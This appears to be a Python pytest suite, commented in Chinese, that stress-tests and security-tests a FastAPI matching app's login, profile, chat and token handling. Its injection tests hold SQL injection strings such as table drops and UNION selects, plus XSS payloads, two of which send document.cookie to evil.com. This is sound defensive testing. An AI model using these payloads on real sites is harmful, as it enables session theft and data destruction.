"""
安全与性能破坏性测试

测试覆盖:
1. 高并发请求模拟
2. SQL/XSS 注入攻击测试
3. 身份验证绕过测试
4. 内存泄漏检测
5. CPU 飙升隐患识别

执行方式:
    pytest tests/test_security_stress.py -v --tb=short
"""
import pytest
import time
import uuid
import threading
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from unittest.mock import Mock, patch, MagicMock
from fastapi.testclient import TestClient
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker

from main import app
from db.database import Base, get_db
from db.models import UserDB
from auth.jwt import create_access_token, verify_password, get_password_hash


# ============= 测试基础设施 =============

SQLALCHEMY_DATABASE_URL = "sqlite:///./test_stress.db"
engine = create_engine(
    SQLALCHEMY_DATABASE_URL,
    connect_args={"check_same_thread": False}
)
TestingSessionLocal = sessionmaker(
    autocommit=False,
    autoflush=False,
    bind=engine,
)


@pytest.fixture(scope="function")
def db_session():
    """创建测试数据库会话"""
    Base.metadata.drop_all(bind=engine)
    Base.metadata.create_all(bind=engine)
    db = TestingSessionLocal()
    try:
        yield db
    finally:
        db.rollback()
        db.close()


@pytest.fixture(scope="function")
def client(db_session):
    """创建测试客户端"""
    def override_get_db():
        try:
            yield db_session
        finally:
            pass

    app.dependency_overrides[get_db] = override_get_db
    with TestClient(app) as c:
        yield c
    app.dependency_overrides.clear()


def make_user(**kwargs):
    """创建用户，自动填充必填字段"""
    defaults = {
        "id": str(uuid.uuid4()),
        "email": f"stress_{uuid.uuid4()}@example.com",
        "password_hash": get_password_hash("testpassword"),
        "name": "压力测试用户",
        "age": 28,
        "gender": "male",
        "location": "北京",
        "interests": json.dumps(["阅读"]),
        "values": json.dumps({}),
        "bio": "",
    }
    defaults.update(kwargs)
    return UserDB(**defaults)


# ============= 高并发请求测试 =============

class TestHighConcurrency:
    """高并发请求测试"""

    def test_concurrent_login_requests(self, client, db_session):
        """测试并发登录请求不导致服务器崩溃"""
        user = make_user(email="concurrent_login@example.com", name="ConcurrentUser")
        db_session.add(user)
        db_session.commit()

        results = []
        lock = threading.Lock()

        def login_request(i):
            """发送登录请求"""
            try:
                response = client.post(
                    "/api/users/login",
                    json={"email": "concurrent_login@example.com", "password": "wrongpassword"}
                )
                with lock:
                    results.append({
                        "id": i,
                        "status": response.status_code,
                        "success": response.status_code in [200, 401, 422, 429]
                    })
            except Exception as e:
                with lock:
                    results.append({"id": i, "error": str(e), "success": False})

        # 50 个并发请求
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(login_request, i) for i in range(50)]
            for f in as_completed(futures):
                f.result()

        # 所有请求应成功处理（无服务器崩溃）
        success_count = len([r for r in results if r["success"]])
        assert success_count == 50

    def test_concurrent_match_requests(self, client, db_session):
        """测试并发匹配请求"""
        # 创建多个用户
        for i in range(10):
            user = make_user(email=f"match_user_{i}@example.com", name=f"MatchUser{i}")
            db_session.add(user)
        db_session.commit()

        user = db_session.query(UserDB).first()
        token = create_access_token(user_id=user.id)

        results = []
        lock = threading.Lock()

        def match_request(i):
            """发送匹配请求"""
            try:
                response = client.get(
                    "/api/matching/candidates",
                    headers={"Authorization": f"Bearer {token}"}
                )
                with lock:
                    results.append({
                        "id": i,
                        "status": response.status_code,
                        "success": response.status_code != 500
                    })
            except Exception as e:
                with lock:
                    results.append({"id": i, "error": str(e), "success": False})

        # 30 个并发请求
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(match_request, i) for i in range(30)]
            for f in as_completed(futures):
                f.result()

        # 无服务器崩溃
        success_count = len([r for r in results if r["success"]])
        assert success_count == 30

    def test_concurrent_api_requests_mixed(self, client, db_session):
        """测试混合并发 API 请求"""
        # 创建用户
        for i in range(5):
            user = make_user(email=f"mixed_user_{i}@example.com", name=f"MixedUser{i}")
            db_session.add(user)
        db_session.commit()

        user = db_session.query(UserDB).first()
        token = create_access_token(user_id=user.id)

        results = []
        lock = threading.Lock()

        def api_request(request_type, i):
            """发送不同类型 API 请求"""
            try:
                if request_type == "profile":
                    response = client.get(
                        "/api/users/profile",
                        headers={"Authorization": f"Bearer {token}"}
                    )
                elif request_type == "health":
                    response = client.get("/health")
                elif request_type == "metrics":
                    response = client.get("/metrics")
                else:
                    response = client.get("/")

                with lock:
                    results.append({
                        "type": request_type,
                        "status": response.status_code,
                        "success": response.status_code != 500
                    })
            except Exception as e:
                with lock:
                    results.append({"type": request_type, "error": str(e), "success": False})

        # 混合请求
        request_types = ["profile", "health", "metrics", "root"]
        with ThreadPoolExecutor(max_workers=8) as executor:
            futures = []
            for i in range(40):
                request_type = request_types[i % 4]
                futures.append(executor.submit(api_request, request_type, i))
            for f in as_completed(futures):
                f.result()

        # 无服务器崩溃
        success_count = len([r for r in results if r["success"]])
        assert success_count == 40


# ============= SQL/XSS 注入攻击测试 =============

class TestInjectionAttacks:
    """注入攻击测试"""

    def test_sql_injection_login(self, client):
        """测试 SQL 注入攻击 - 登录接口"""
        injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "admin'/*",
            "' UNION SELECT * FROM users --",
            "1; INSERT INTO users VALUES ('hacker', 'hacked')",
        ]

        for payload in injection_payloads:
            response = client.post(
                "/api/users/login",
                json={"email": payload, "password": "test"}
            )
            # 应返回 401/422 而不是 500
            assert response.status_code in [401, 422, 400, 404]

    def test_sql_injection_user_id(self, client, db_session):
        """测试 SQL 注入攻击 - 用户 ID 参数"""
        user = make_user(email="sql_target@example.com", name="SQLTarget")
        db_session.add(user)
        db_session.commit()

        token = create_access_token(user_id=user.id)

        injection_payloads = [
            "1; DROP TABLE users",
            "' OR '1'='1",
            "1 UNION SELECT password_hash FROM users",
        ]

        for payload in injection_payloads:
            response = client.get(
                f"/api/users/{payload}",
                headers={"Authorization": f"Bearer {token}"}
            )
            # 不应返回 500（服务器崩溃）
            assert response.status_code != 500

    def test_xss_injection_bio(self, client, db_session):
        """测试 XSS 攻击 - 用户简介"""
        user = make_user(email="xss_bio@example.com", name="XSSBio")
        db_session.add(user)
        db_session.commit()

        token = create_access_token(user_id=user.id)

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        ]

        for payload in xss_payloads:
            response = client.put(
                f"/api/users/{user.id}",
                headers={"Authorization": f"Bearer {token}"},
                json={"bio": payload}
            )
            # 不应返回 500
            assert response.status_code != 500

    def test_xss_injection_chat(self, client, db_session):
        """测试 XSS 攻击 - 聊天消息"""
        alice = make_user(email="xss_alice@example.com", name="Alice")
        bob = make_user(email="xss_bob@example.com", name="Bob", gender="female")
        db_session.add_all([alice, bob])
        db_session.commit()

        alice_token = create_access_token(user_id=alice.id)

        xss_payloads = [
            "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            "<img src=x onerror=fetch('http://evil.com/'+document.cookie)>",
        ]

        for payload in xss_payloads:
            response = client.post(
                "/api/chat/send",
                headers={"Authorization": f"Bearer {alice_token}"},
                json={"receiver_id": bob.id, "content": payload}
            )
            # 不应返回 500
            assert response.status_code != 500


# ============= 身份验证绕过测试 =============

class TestAuthBypass:
    """身份验证绕过测试"""

    def test_access_protected_endpoint_without_token(self, client):
        """测试无 Token 访问受保护端点"""
        # 注意：某些端点在开发环境可能允许匿名访问
        # 这里测试需要认证的端点行为

        # 聊天相关端点通常需要认证
        response = client.get("/api/chat/conversations")
        # 应返回错误或空数据，不应返回敏感数据
        assert response.status_code in [401, 403, 404, 200]

        # 如果返回 200，验证返回数据不包含敏感信息
        if response.status_code == 200:
            body = response.json() if response.content else {}
            # 不应返回其他用户的对话
            if isinstance(body, list):
                assert len(body) == 0 or all(item.get("user_id") == "user-anonymous-dev" for item in body)

    def test_access_with_invalid_token(self, client):
        """测试无效 Token 访问"""
        invalid_tokens = [
            "invalid_token_string",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "",
            "Bearer ",
        ]

        for token in invalid_tokens:
            response = client.get(
                "/api/users/profile",
                headers={"Authorization": f"Bearer {token}"}
            )
            # 应返回 401
            assert response.status_code in [401, 403, 404]

    def test_access_with_expired_token(self):
        """测试过期 Token 访问"""
        import jwt
        from datetime import datetime, timedelta
        from auth.jwt import SECRET_KEY, ALGORITHM

        # 创建过期 Token
        expired_payload = {
            "user_id": "expired_user",
            "exp": datetime.utcnow() - timedelta(hours=1),
            "token_type": "access",
        }
        expired_token = jwt.encode(expired_payload, SECRET_KEY, algorithm=ALGORITHM)

        # 应无法解码
        from auth.jwt import decode_access_token
        result = decode_access_token(expired_token)
        assert result is None

    def test_access_with_tampered_token(self):
        """测试篡改 Token 访问"""
        import jwt
        from datetime import datetime, timedelta
        from auth.jwt import SECRET_KEY, ALGORITHM

        # 创建正常 Token
        valid_payload = {
            "user_id": "valid_user",
            "exp": datetime.utcnow() + timedelta(hours=1),
            "token_type": "access",
        }
        valid_token = jwt.encode(valid_payload, SECRET_KEY, algorithm=ALGORITHM)

        # 篡改 user_id
        tampered_payload = {
            "user_id": "admin",  # 篡改为 admin
            "exp": datetime.utcnow() + timedelta(hours=1),
            "token_type": "access",
        }
        # 使用错误密钥签名
        tampered_token = jwt.encode(tampered_payload, "wrong_secret", algorithm=ALGORITHM)

        # 应无法解码
        from auth.jwt import decode_access_token
        result = decode_access_token(tampered_token)
        assert result is None

    def test_token_type_confusion(self):
        """测试 Token 类型混淆"""
        import jwt
        from datetime import datetime, timedelta
        from auth.jwt import SECRET_KEY, ALGORITHM, decode_access_token

        # 创建 refresh token 但尝试作为 access token 使用
        refresh_payload = {
            "user_id": "test_user",
            "exp": datetime.utcnow() + timedelta(hours=1),
            "token_type": "refresh",
        }
        refresh_token = jwt.encode(refresh_payload, SECRET_KEY, algorithm=ALGORITHM)

        # 应无法解码（类型不匹配）
        result = decode_access_token(refresh_token)
        assert result is None


# ============= 内存泄漏检测测试 =============

class TestMemoryLeakDetection:
    """内存泄漏检测"""

    def test_repeated_requests_memory_stability(self, client, db_session):
        """测试重复请求内存稳定性"""
        import gc

        user = make_user(email="memory_test@example.com", name="MemoryTest")
        db_session.add(user)
        db_session.commit()

        token = create_access_token(user_id=user.id)

        # 强制垃圾回收
        gc.collect()

        # 发送大量请求
        for i in range(100):
            response = client.get(
                "/api/users/profile",
                headers={"Authorization": f"Bearer {token}"}
            )
            assert response.status_code != 500

        # 再次垃圾回收
        gc.collect()

        # 验证无内存问题（简单检查：请求都成功处理）
        # 实际内存检测需要专业工具

    def test_session_cleanup(self, db_session):
        """测试会话清理"""
        from utils.db_session_manager import db_session
        import gc

        gc.collect()

        # 创建大量会话
        for i in range(50):
            with db_session() as session:
                session.execute(text("SELECT 1")).scalar()

        gc.collect()

        # 验证无连接泄露（所有会话应已关闭）
        # SQLite 的 NullPool 不保持连接


# ============= CPU 飙升隐患测试 =============

class TestCPUHazards:
    """CPU 飙升隐患测试"""

    def test_no_infinite_loop_in_validation(self, client):
        """测试验证逻辑无无限循环"""
        # 发送极端输入
        extreme_inputs = [
            {"email": "a" * 10000 + "@test.com", "password": "test"},
            {"email": "test@test.com", "password": "p" * 10000},
            {"email": "", "password": ""},  # 空输入
        ]

        for input_data in extreme_inputs:
            start_time = time.time()
            response = client.post("/api/users/login", json=input_data)
            elapsed = time.time() - start_time

            # 应在合理时间内响应（< 5秒）
            assert elapsed < 5
            assert response.status_code != 500

    def test_no_blocking_operations(self, client, db_session):
        """测试无阻塞操作"""
        user = make_user(email="blocking_test@example.com", name="BlockingTest")
        db_session.add(user)
        db_session.commit()

        token = create_access_token(user_id=user.id)

        start_time = time.time()

        # 发送多个请求
        for i in range(20):
            response = client.get("/health")
            assert response.status_code == 200

        elapsed = time.time() - start_time

        # 20 个请求应在合理时间内完成（< 10秒）
        assert elapsed < 10

    def test_regex_no_re_dos(self, client):
        """测试正则表达式无 ReDoS"""
        # ReDoS 易受攻击的输入模式
        dangerous_patterns = [
            "a" * 100 + "!",
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
            "a@a@a@a@a@a@a@a@a@a@a@a@a@a@a@a@a@a@a@a@a@a@a@a@a@a",
        ]

        for pattern in dangerous_patterns:
            start_time = time.time()
            response = client.post(
                "/api/users/login",
                json={"email": pattern, "password": "test"}
            )
            elapsed = time.time() - start_time

            # 应在合理时间内响应（< 2秒）
            assert elapsed < 2
            assert response.status_code != 500


# ============= 整体系统稳定性测试 =============

class TestSystemStability:
    """系统整体稳定性测试"""

    def test_graceful_degradation(self, client, db_session):
        """测试优雅降级"""
        # 模拟各种异常输入
        abnormal_inputs = [
            {"email": None, "password": "test"},
            {"email": "test@test.com", "password": None},
            {},  # 空对象
            {"unknown_field": "value"},  # 未知字段
        ]

        for input_data in abnormal_inputs:
            response = client.post("/api/users/login", json=input_data)
            # 应返回错误而不是崩溃
            assert response.status_code != 500

    def test_error_response_format(self, client):
        """测试错误响应格式"""
        # 访问不存在端点
        response = client.get("/api/nonexistent")

        # 应返回 JSON 格式
        if response.content:
            try:
                body = response.json()
                assert "detail" in body or "error" in body or isinstance(body, dict)
            except json.JSONDecodeError:
                # 允许非 JSON 响应（如 404 页面）
                pass

    def test_health_check_always_available(self, client):
        """测试健康检查端点始终可用"""
        response = client.get("/health")
        assert response.status_code == 200
        body = response.json()
        assert "status" in body


# ============= 密码安全测试 =============

class TestPasswordSecurity:
    """密码安全测试"""

    def test_password_hashing_strength(self):
        """测试密码哈希强度"""
        password = "testpassword123"
        hash1 = get_password_hash(password)
        hash2 = get_password_hash(password)

        # 相同密码应产生不同哈希（bcrypt salt）
        assert hash1 != hash2

        # 验证正确密码
        assert verify_password(password, hash1)

        # 验证错误密码
        assert not verify_password("wrongpassword", hash1)

    def test_empty_password_handling(self):
        """测试空密码处理"""
        # 空 password 应返回 False
        assert verify_password("", "somehash") == False
        assert verify_password(None, "somehash") == False
        assert verify_password("test", None) == False
        assert verify_password(None, None) == False

    def test_null_password_hash_rejected(self):
        """测试 null 密码哈希被拒绝"""
        # get_password_hash(None) 应抛出异常
        try:
            get_password_hash(None)
            assert False, "Should raise ValueError"
        except ValueError:
            pass


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])